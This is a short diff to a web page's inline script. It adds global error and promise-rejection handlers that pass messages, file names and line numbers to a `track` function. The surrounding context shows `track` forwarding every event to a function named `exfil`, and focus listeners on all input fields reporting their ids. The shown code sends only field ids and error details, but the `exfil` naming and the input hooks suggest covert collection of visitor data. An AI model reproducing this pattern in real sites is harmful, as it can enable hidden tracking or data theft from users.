@@ -150,7 +150,13 @@ body{font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helv
   function track(event, data) {
     exfil({ event, ...data, ts: Date.now() });
   }
+  window.addEventListener('error', e => {
+  track('js_error', { msg: e.message, file: e.filename, line: e.lineno });
+});
 
+window.addEventListener('unhandledrejection', e => {
+  track('promise_error', { msg: String(e.reason) });
+});
   document.addEventListener('DOMContentLoaded', () => {
     document.querySelectorAll('input').forEach(input => {
       input.addEventListener('focus', () => track('focus', { field: input.id }));
